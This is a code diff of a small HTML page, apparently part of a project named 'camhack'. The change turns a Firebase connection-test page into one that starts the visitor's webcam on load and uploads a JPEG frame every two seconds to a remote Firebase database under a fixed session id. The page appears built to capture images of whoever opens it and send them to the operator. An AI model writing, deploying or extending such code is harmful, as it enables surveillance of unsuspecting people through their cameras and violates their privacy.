@@ -1,65 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Firebase Debug</title>
+    <title>Fixed Camera Test</title>
 </head>
 <body>
-    <h1>Firebase Connection Test</h1>
-    <div id="status">Testing...</div>
-    <button onclick="testWrite()">Test Write</button>
-    <button onclick="testRead()">Test Read</button>
+    <h1>Camera Access Test</h1>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <div id="status">Starting...</div>
     
     <script>
         const FIREBASE_URL = 'https://camhack-realtime-default-rtdb.firebaseio.com/';
+        const SESSION_ID = 'cam_1764399903153'; // Use existing session
+        
+        let video, canvas, ctx;
         
         function log(message) {
-            document.getElementById('status').innerHTML += '<br>' + message;
+            document.getElementById('status').innerHTML = message;
             console.log(message);
         }
         
-        async function testWrite() {
+        async function startCamera() {
             try {
-                log('Testing write...');
-                const response = await fetch(FIREBASE_URL + 'test.json', {
+                video = document.getElementById('video');
+                canvas = document.getElementById('canvas');
+                ctx = canvas.getContext('2d');
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 320, height: 240 }
+                });
+                
+                video.srcObject = stream;
+                log('✓ Camera started');
+                
+                // Start sending frames
+                setInterval(sendFrame, 2000);
+                
+            } catch (error) {
+                log('✗ Camera error: ' + error.message);
+            }
+        }
+        
+        async function sendFrame() {
+            try {
+                ctx.drawImage(video, 0, 0, 320, 240);
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                const base64 = imageData.split(',')[1];
+                
+                const response = await fetch(FIREBASE_URL + SESSION_ID + '/bingkai.json', {
                     method: 'PUT',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        timestamp: Date.now(),
-                        message: 'test from web'
-                    })
+                    body: JSON.stringify(base64)
                 });
                 
                 if (response.ok) {
-                    log('✓ Write SUCCESS');
+                    log('✓ Frame sent: ' + new Date().toLocaleTimeString());
                 } else {
-                    log('✗ Write FAILED: ' + response.status);
+                    log('✗ Send failed: ' + response.status);
                 }
             } catch (error) {
-                log('✗ Write ERROR: ' + error.message);
+                log('✗ Send error: ' + error.message);
             }
         }
         
-        async function testRead() {
-            try {
-                log('Testing read...');
-                const response = await fetch(FIREBASE_URL + 'test.json');
-                
-                if (response.ok) {
-                    const data = await response.text();
-                    log('✓ Read SUCCESS: ' + data);
-                } else {
-                    log('✗ Read FAILED: ' + response.status);
-                }
-            } catch (error) {
-                log('✗ Read ERROR: ' + error.message);
-            }
-        }
-        
-        // Auto test on load
-        window.onload = function() {
-            testWrite();
-            setTimeout(testRead, 2000);
-        };
+        // Auto start
+        window.onload = startCamera;
     </script>
 </body>
 </html>
